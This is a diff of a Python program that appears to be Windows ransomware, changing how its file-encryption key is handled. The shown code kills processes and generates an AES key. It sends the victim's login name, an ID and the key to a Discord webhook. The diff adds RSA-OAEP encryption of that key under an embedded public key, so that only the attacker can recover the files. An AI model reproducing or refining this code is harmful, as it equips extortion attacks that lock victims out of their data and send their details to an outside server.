@@ -24,9 +24,21 @@ from Crypto.Cipher import AES # hidden import
 from win32com.client import Dispatch
 from file_crypto import encrypt_file # type: ignore
 from discord_webhook import DiscordEmbed, DiscordWebhook
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 YOUR_WEBHOOK_URL = ""
 id = ""
+
+# Add RSA public key for encryption
+RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
+MIIBCgKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/gOID2
+EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmnBQJs
+rmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuBydKlcp
+xwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992jFJ3j
+8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxdtH80
+fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQAB
+-----END RSA PUBLIC KEY-----"""
 
 
 def is_admin():
@@ -295,14 +307,26 @@ def block_processes():
         execute_command(f"taskkill /f /im {proc}.exe")
 
 
+def encrypt_key(aes_key):
+    rsa_key = RSA.import_key(RSA_PUBLIC_KEY)
+    cipher_rsa = PKCS1_OAEP.new(rsa_key)
+    encrypted_key = cipher_rsa.encrypt(aes_key)
+    return encrypted_key
+
+
 def start_encryption():
     global id
     webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
     id = uuid.uuid1()
     key = get_random_bytes(16)
+    
+    key_b64 = base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()
+    encrypted_key = encrypt_key(key_b64)
+    
+    
     embed = DiscordEmbed(
-        title=f"Username: {os.getlogin()} | ID: {id} | Date: {datetime.now().strftime("%d-%m-%Y")}",
-        description=f"Key: {base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()}",
+        title=f"Username: {os.getlogin()} | ID: {id} | Date: {datetime.now().strftime('%d-%m-%Y')}",
+        description=f"Key: {encrypted_key}",
     )
     webhook.add_embed(embed)
     webhook.execute()
